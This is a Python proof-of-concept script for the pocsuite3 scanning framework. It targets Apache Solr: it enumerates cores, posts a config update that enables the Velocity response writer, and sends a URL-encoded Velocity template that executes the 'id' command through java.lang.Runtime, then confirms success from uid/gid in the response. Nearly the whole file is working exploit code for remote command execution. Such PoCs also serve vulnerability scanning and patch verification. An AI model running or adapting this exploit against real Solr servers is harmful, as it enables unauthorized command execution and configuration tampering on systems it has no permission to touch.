#!/usr/bin/env python
# coding: utf-8
from pocsuite3.api import requests
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from urllib.parse import urlparse
import base64
import json

def urlparse_to_ip_port(rhost):

    host = urlparse(rhost).netloc
    if ':' in host:
        ip,port = host.split(':')
    else:
        ip = host
        port = 0
    return ip,int(port)

class TestPOC(POCBase):
    vulID = ''
    cveID = ''
    version = 'high'
    author = ['csy']
    vulDate = ''
    createDate = ''
    updateDate = ''
    references = ['']
    name = ''
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = '远程执行'
    desc = '''
    
    '''
    samples = ['']
    install_requires = ['']
    #请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段
    def _attack(self):
        result = {}
        #Write your code here
        return self.parse_output(result)


    def get_name(self,url):

        url += "/solr/admin/cores?wt=json&indexInfo=false"
        
        conn = requests.get(url)
        name = "test"
        try:
            name = list(json.loads(conn.text)["status"])[0]
            # print(name)
        except:
            pass
        return name


    def update_conf(self,url,name):
        url = url + "/solr/"+name+"/config"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
        }
        # proxy = {'http':'http://127.0.0.1:8080'}
        post_data = """
        {
            "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
            }
        }
        """
        conn = requests.post(url,data=post_data,headers=headers)
        # print(conn.text)
        if conn.status_code != 200:
            return 0
        return 1


    def _verify(self):
        result = {}
        ip,port = urlparse_to_ip_port(self.url)
        if not port and "http://" in self.url:
            port = 80
        elif not port and "https://" in self.url:
            port = 443
        #Write your code here
        
        core_name = self.get_name(self.url)
        self.update_conf(self.url,core_name)
        
        payload = "/solr/"+core_name+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
        headers = {
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'Content-Type':'application/x-www-form-urlencoded'
        }
        url = self.url+payload
        # print(url)
        resp = requests.post(url=url,verify=False,timeout=10)
        str1 = "uid"
        str2 = 'gid'
        # print(resp.text)
        if str1 in resp.content.decode('utf-8') and str2 in resp.content.decode('utf-8'):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = resp.url
            result['VerifyInfo']['PAYLOAD'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)